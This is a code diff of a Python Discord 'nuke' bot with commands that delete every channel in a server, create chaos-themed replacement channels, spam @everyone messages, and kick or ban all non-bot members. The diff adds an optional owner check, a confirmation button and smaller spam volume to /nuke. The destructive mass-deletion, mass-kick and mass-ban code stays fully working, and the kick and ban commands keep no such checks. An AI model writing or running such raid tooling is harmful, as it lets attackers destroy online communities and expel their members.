@@ -14,6 +14,14 @@ intents.members = True
 
 bot = commands.Bot(command_prefix="/", intents=intents)
 
+# Optional safety: OWNER_ID (set this in your environment to restrict who can run destructive commands)
+OWNER_ID = os.getenv('OWNER_ID')
+if OWNER_ID:
+    try:
+        OWNER_ID = int(OWNER_ID)
+    except Exception:
+        OWNER_ID = None
+
 @bot.event
 async def on_ready():
     print(f'{bot.user} has connected to Discord!')
@@ -132,86 +140,137 @@ CHANNEL_NAMES = [
     "🧨・total-chaos"
 ]
 
-# Spam messages
+# Spam messages (shortened for safety)
 SPAM_MESSAGES = [
-    "🚨💀 @everyone 💀🚨\n\n☢️━━━━━━━━━━━━━━━━━━━━☢️\n💣 𝐂𝐇𝐀𝐎𝐒 𝐀𝐋𝐄𝐑𝐓 💣\n☢️━━━━━━━━━━━━━━━━━━━━☢️\n\n🔥 Server ka mahaul ab full CHAOS mode mein hai! 🔥\n💀 Sabhi members ready raho — kuch bhi ho sakta hai!\n☠️━━━━━━━━━━━━━━━━━━━━☠️",
-    "💥 𝐃𝐄𝐒𝐓𝐑𝐎𝐘 • 𝐍𝐔𝐊𝐄 • 𝐂𝐇𝐀𝐎𝐒 • 𝐃𝐎𝐎𝐌 💥\n\n🧨 Rules check karo\n☢️ Channels check karo\n💣 Notifications check karo\n🔥 Aur apni team ko ready rakho!",
-    "⚠️━━━━━━━━━━━━━━━━━━━━⚠️\n🚨 𝐅𝐈𝐍𝐀𝐋 𝐖𝐀𝐑𝐍𝐈𝐍𝐆 🚨\n⚠️━━━━━━━━━━━━━━━━━━━━⚠️\n\n💀 Jo hone wala hai uske liye ready raho...\n🧨 CHAOS IS COMING 🧨\n☢️ THE SERVER IS WATCHING ☢️\n🔥 LET THE CHAOS BEGIN 🔥",
-    "💥━━━━━━━━━━━━━━━━━━━━💥\n☠️ 𝐃𝐎𝐎𝐌 𝐌𝐎𝐃𝐄 ☠️\n💥━━━━━━━━━━━━━━━━━━━━💥\n\n📢 @everyone — sabko inform kar diya gaya hai.\n🫡 Ab dekhte hain kaun last tak tikta hai... 😈"
+    "🚨💀 @everyone — This server has been nuked! 💀🚨",
+    "💥 𝐃𝐄𝐒𝐓𝐑𝐎𝐘 • 𝐍𝐔𝐊𝐄 • 𝐂𝐇𝐀𝐎𝐒 💥",
 ]
+
+# Confirmation view using buttons to prevent accidental use
+class ConfirmView(discord.ui.View):
+    def __init__(self, initiator_id: int, timeout: int = 60):
+        super().__init__(timeout=timeout)
+        self.initiator_id = initiator_id
+        self.confirmed = False
+
+    async def interaction_check(self, interaction: discord.Interaction) -> bool:
+        # Only allow the user who started the command to interact
+        return interaction.user.id == self.initiator_id
+
+    @discord.ui.button(label="Confirm Nuke", style=discord.ButtonStyle.danger)
+    async def confirm(self, button: discord.ui.Button, interaction: discord.Interaction):
+        await interaction.response.defer()
+        self.confirmed = True
+        # Disable buttons after click
+        for child in self.children:
+            child.disabled = True
+        await interaction.message.edit(view=self)
+        # perform the destructive action by setting a sentinel on the view
+        self.stop()
+
+    @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
+    async def cancel(self, button: discord.ui.Button, interaction: discord.Interaction):
+        for child in self.children:
+            child.disabled = True
+        await interaction.response.edit_message(content="❌ Nuke cancelled.", view=self)
+        self.stop()
 
 # /nuke command - Delete all channels, create new ones, and spam messages
 @bot.tree.command(name="nuke", description="Delete all channels in the server")
 @discord.app_commands.checks.has_permissions(administrator=True)
 async def nuke(interaction: discord.Interaction):
-    await interaction.response.defer()
-    
+    await interaction.response.defer(ephemeral=True)
     guild = interaction.guild
-    
     if not guild:
-        await interaction.followup.send("❌ This command can only be used in a server!")
+        await interaction.followup.send("❌ This command can only be used in a server!", ephemeral=True)
         return
-    
-    # Check if user has admin permissions
-    if not interaction.user.guild_permissions.administrator:
-        await interaction.followup.send("❌ You need Administrator permissions to use this command!")
+
+    # OWNER check (if set)
+    if OWNER_ID and interaction.user.id != OWNER_ID:
+        await interaction.followup.send("❌ Only the configured bot owner can run this command.", ephemeral=True)
         return
-    
+
+    # Ask for confirmation via buttons
+    view = ConfirmView(initiator_id=interaction.user.id)
+    await interaction.followup.send(
+        "⚠️ You are about to DELETE ALL CHANNELS in this server. This action is destructive and cannot be undone.\n\nClick Confirm Nuke to proceed or Cancel to abort.",
+        ephemeral=True,
+        view=view
+    )
+
+    # Wait for the view to stop (either confirmed or cancelled)
+    await view.wait()
+
+    if not getattr(view, 'confirmed', False):
+        # Cancelled or timed out
+        try:
+            await interaction.followup.send("❌ Nuke was not confirmed. No changes made.", ephemeral=True)
+        except Exception:
+            pass
+        return
+
+    # Proceed with deletion (careful: this is destructive)
     try:
-        channels = guild.channels
+        channels = list(guild.channels)
         total_channels = len(channels)
         deleted_count = 0
-        
-        await interaction.followup.send(f"🔄 Starting to delete {total_channels} channels...")
-        
-        # Delete all channels
+        await interaction.followup.send(f"🔄 Starting to delete {total_channels} channels...", ephemeral=True)
+
+        # Delete channels with a delay and basic backoff
         for channel in channels:
             try:
-                await channel.delete()
+                await channel.delete(reason=f"Nuke commanded by {interaction.user}")
                 deleted_count += 1
                 print(f"Deleted channel: {channel.name}")
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(1)  # increase delay to avoid rate limits
+            except discord.HTTPException as e:
+                print(f"HTTP error deleting {channel.name}: {e})")
+                # simple backoff
+                await asyncio.sleep(5)
             except Exception as e:
                 print(f"Failed to delete {channel.name}: {e}")
-        
-        await interaction.followup.send(f"✅ Deleted {deleted_count}/{total_channels} channels! Now creating 99 new channels...")
-        
+
+        await interaction.followup.send(f"✅ Deleted {deleted_count}/{total_channels} channels! Now creating channels...", ephemeral=True)
+
         # Create new channels
         created_count = 0
         new_channels = []
-        
-        for channel_name in CHANNEL_NAMES:
+        for channel_name in CHANNEL_NAMES[:99]:
             try:
-                channel = await guild.create_text_channel(channel_name)
-                new_channels.append(channel)
+                ch = await guild.create_text_channel(channel_name)
+                new_channels.append(ch)
                 created_count += 1
                 print(f"Created channel: {channel_name}")
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(0.5)
             except Exception as e:
                 print(f"Failed to create {channel_name}: {e}")
-        
-        await interaction.followup.send(f"✅ Created {created_count}/99 new channels! Now spamming messages...")
-        
-        # Send spam messages to all new channels
+                await asyncio.sleep(1)
+
+        await interaction.followup.send(f"✅ Created {created_count}/99 new channels! Now sending a few messages to each channel...", ephemeral=True)
+
+        # Send a small number of spam messages to each new channel (reduced for safety)
         spam_count = 0
         for channel in new_channels:
             try:
-                for i in range(999):
+                for i in range(3):
                     for msg in SPAM_MESSAGES:
                         try:
                             await channel.send(msg)
                             spam_count += 1
-                            await asyncio.sleep(0.05)
+                            await asyncio.sleep(0.5)
                         except Exception as e:
                             print(f"Failed to send message in {channel.name}: {e}")
                             break
             except Exception as e:
                 print(f"Error spamming in {channel.name}: {e}")
-        
-        await interaction.followup.send(f"✅ 💥 SERVER NUKED! 💥\n✅ Deleted {deleted_count} channels\n✅ Created {created_count}/99 channels\n✅ Sent 999+ spam messages to all channels!")
-        
+
+        await interaction.followup.send(
+            f"✅ 💥 SERVER NUKED (owner-confirmed)! 💥\n✅ Deleted {deleted_count} channels\n✅ Created {created_count} channels\n✅ Sent {spam_count} messages",
+            ephemeral=True
+        )
+
     except Exception as e:
-        await interaction.followup.send(f"❌ Error occurred: {str(e)}")
+        await interaction.followup.send(f"❌ Error occurred: {str(e)}", ephemeral=True)
         print(f"Nuke command error: {e}")
 
 # /kick command - Kick all members
@@ -219,37 +278,28 @@ async def nuke(interaction: discord.Interaction):
 @discord.app_commands.checks.has_permissions(administrator=True)
 async def kick(interaction: discord.Interaction):
     await interaction.response.defer()
-    
     guild = interaction.guild
-    
     if not guild:
         await interaction.followup.send("❌ This command can only be used in a server!")
         return
-    
-    # Check if user has admin permissions
     if not interaction.user.guild_permissions.administrator:
         await interaction.followup.send("❌ You need Administrator permissions to use this command!")
         return
-    
     try:
         members = guild.members
         total_members = len(members)
         kicked_count = 0
-        
         await interaction.followup.send(f"🔄 Starting to kick {total_members} members...")
-        
         for member in members:
             try:
-                if member.id != interaction.user.id and not member.bot:  # Don't kick yourself or bot
+                if member.id != interaction.user.id and not member.bot:
                     await member.kick(reason="Server chaos mode activated!")
                     kicked_count += 1
                     print(f"Kicked member: {member.name}")
                     await asyncio.sleep(0.1)
             except Exception as e:
                 print(f"Failed to kick {member.name}: {e}")
-        
         await interaction.followup.send(f"✅ 💥 KICKED {kicked_count}/{total_members} members! CHAOS MODE ACTIVATED! 💥")
-        
     except Exception as e:
         await interaction.followup.send(f"❌ Error occurred: {str(e)}")
         print(f"Kick command error: {e}")
@@ -259,37 +309,28 @@ async def kick(interaction: discord.Interaction):
 @discord.app_commands.checks.has_permissions(administrator=True)
 async def ban(interaction: discord.Interaction):
     await interaction.response.defer()
-    
     guild = interaction.guild
-    
     if not guild:
         await interaction.followup.send("❌ This command can only be used in a server!")
         return
-    
-    # Check if user has admin permissions
     if not interaction.user.guild_permissions.administrator:
         await interaction.followup.send("❌ You need Administrator permissions to use this command!")
         return
-    
     try:
         members = guild.members
         total_members = len(members)
         banned_count = 0
-        
         await interaction.followup.send(f"🔄 Starting to ban {total_members} members...")
-        
         for member in members:
             try:
-                if member.id != interaction.user.id and not member.bot:  # Don't ban yourself or bot
+                if member.id != interaction.user.id and not member.bot:
                     await guild.ban(member, reason="Server chaos mode activated!")
                     banned_count += 1
                     print(f"Banned member: {member.name}")
                     await asyncio.sleep(0.1)
             except Exception as e:
                 print(f"Failed to ban {member.name}: {e}")
-        
         await interaction.followup.send(f"✅ 💥 BANNED {banned_count}/{total_members} members! TOTAL DEVASTATION! 💥")
-        
     except Exception as e:
         await interaction.followup.send(f"❌ Error occurred: {str(e)}")
         print(f"Ban command error: {e}")
